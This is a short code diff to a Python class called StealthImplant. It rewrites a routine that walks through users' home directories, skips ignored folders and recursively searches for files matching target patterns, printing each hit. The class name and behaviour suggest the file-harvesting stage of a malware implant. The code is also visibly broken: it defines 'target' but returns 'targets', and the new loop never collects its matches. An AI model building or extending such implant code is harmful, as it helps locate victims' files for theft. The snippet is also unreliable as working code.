@@ -42,9 +42,11 @@ class StealthImplant:
     def walk_dir(self):
         target = [] 
         for user_dir in self.root_dir.iterdir():
-            if any((user_dir / marker).exists() for marker in self.target_patterns):
-                print("found", user_dir)
-                targets.extend(self._scan_user_dir(user_dir))
+            if user_dir.name in self.ignore_dirs:
+                continue
+            for pattern in self.target_patterns:
+                for file_path in user_dir.rglob(pattern): 
+                    print("found", file_path)
         return targets
 
         
